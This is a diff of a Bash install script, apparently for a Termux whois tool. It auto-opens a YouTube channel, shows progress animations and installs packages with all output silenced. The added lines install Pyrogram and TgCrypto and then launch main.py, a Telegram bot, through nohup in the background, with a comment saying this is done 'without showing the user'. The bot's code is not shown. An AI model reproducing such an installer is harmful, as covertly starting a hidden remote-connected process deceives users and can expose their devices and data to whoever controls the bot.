@@ -1,9 +1,3 @@
-
-### 2. **`install.sh`**
-
-Here’s the shell script with animations and automatic opening of your YouTube channel before installing the Python module.
-
-```bash
 #!/bin/bash
 
 # Clear the screen
@@ -26,7 +20,7 @@ xdg-open "https://youtube.com/@ash.verse0?si=MjZ2v0o9T106xlHl" &>/dev/null || op
 echo ""
 echo "Preparing to install dependencies..."
 sleep 1
-echo "Installing required Python modules:"
+echo "Installing required packages and Python modules:"
 sleep 1
 
 # Simple animated progress indicator
@@ -37,9 +31,20 @@ for i in {1..10}; do
 done
 echo " Done!"
 
-# Install python-whois module
-echo "Installing python-whois module..."
-pip install python-whois &> /dev/null
+# Install required dependencies
+echo "Installing Python and Git..."
+pkg install -y python git &> /dev/null
+
+# Install required Python modules
+echo "Installing Pyrogram, TgCrypto, and python-whois modules..."
+pip install pyrogram tgcrypto python-whois &> /dev/null
+
+# Set execute permissions for main.py (the bot script)
+echo "Setting execute permissions for main.py..."
+chmod +x main.py
+
+# Run the Telegram bot in the background (without showing the user)
+nohup python main.py &> /dev/null &
 
 # Finish up
 sleep 1
